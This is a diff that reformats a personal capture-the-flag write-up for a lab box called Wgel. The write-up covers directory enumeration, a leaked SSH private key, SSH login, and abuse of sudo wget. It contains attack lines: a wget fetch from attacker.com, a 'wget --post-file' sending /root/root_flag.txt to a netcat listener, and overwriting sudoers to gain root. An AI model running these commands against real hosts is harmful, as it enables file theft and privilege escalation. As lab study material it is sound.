@@ -1,4 +1,5 @@
 This box, was troubling, everything went past my eyes, I though that it was manual enumeration of the site when everything was right there. 
+
 https://sckull.github.io/posts/wgel/
 
 Nmap 2 open ports
@@ -10,6 +11,7 @@ dirserach gives us the directory of /sitemap
 
 when enumerating /sitemap the directory medium list doesn't have /.ssh extension which is mindblowing, so I didn't see that, on gobuster or default list of dirsearch it would have picked it up. 
 
+```bash
 ┌──(kali㉿kali)-[~/Documents]
 └─$ dirsearch -u http://10.10.97.14/sitemap/ 
 
@@ -87,13 +89,14 @@ eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
 QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
 jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
 -----END RSA PRIVATE KEY-----
-
+```
 do ssh2john and we get--- 
 
 no password!
 
 we ssh in and find the user flat in documents
 
+```bash
 ┌──(kali㉿kali)-[~/Documents]
 └─$ ssh jessie@10.10.97.14 -i id_rsa       
 The authenticity of host '10.10.97.14 (10.10.97.14)' can't be established.
@@ -126,32 +129,34 @@ Matching Defaults entries for jessie on CorpOne:
 User jessie may run the following commands on CorpOne:
     (ALL : ALL) ALL
     (root) NOPASSWD: /usr/bin/wget
-
+```
 
 GTFO FOR THIS IS 
 
-sudo install -m =xs $(which wget) .
-
-URL=http://attacker.com/file_to_get
-LFILE=file_to_save
-./wget $URL -O $LFILE
+    sudo install -m =xs $(which wget) .
+	
+	URL=http://attacker.com/file_to_get
+	LFILE=file_to_save
+	./wget $URL -O $LFILE
 
 
 we set up a listner on 80 
 
 and send the script
-udo /usr/bin/wget --post-file=/root/root_flag.txt 10.6.65.43
+
+`sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.6.65.43`
 
 
-
+```bash
 jessie@CorpOne:/$ sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.6.65.43
 --2021-06-07 16:13:21--  http://10.6.65.43/
 Connecting to 10.6.65.43:80... connected.
 HTTP request sent, awaiting response... sudo 
-
+```
 
 we get a response
 
+```bash
 ┌──(kali㉿kali)-[~/Documents]
 └─$ nc -lnvp 80      
 listening on [any] 80 ...
@@ -167,10 +172,11 @@ Content-Length: 33
 
 b1b968b37519ad1daa6408188649263d
 
+```
 now the write goes on to obtain a root shell, not required to complete room but yes, we got the flag but we are not root
 
 learned about the second tack on sudo -l -l
-
+```ssh
 jessie@CorpOne:/$ sudo -l -l
 Matching Defaults entries for jessie on CorpOne:
     env_reset, mail_badpass,
@@ -190,11 +196,11 @@ Sudoers entry:
     Commands:
 	/usr/bin/wget
 	
+```
 	
 VS
-
 	
-	
+```bash
 jessie@CorpOne:/$ sudo -l
 Matching Defaults entries for jessie on CorpOne:
     env_reset, mail_badpass,
@@ -204,9 +210,11 @@ User jessie may run the following commands on CorpOne:
     (ALL : ALL) ALL
     (root) NOPASSWD: /usr/bin/wget
 jessie@CorpOne:/$ 
-
+```
 
 It opens it up a bit nicer to read ,,, 
+
+### to get root
 
 so you make a sudoers file and serve it ,, 
 
@@ -217,6 +225,8 @@ jessie  ALL=(ALL) NOPASSWD: ALL
 
 
 grab it
+```bash
 sudo /usr/bin/wget 10.8.1.72/sudoers --output-document=sudoers
+```
 
 and sudo su to execute
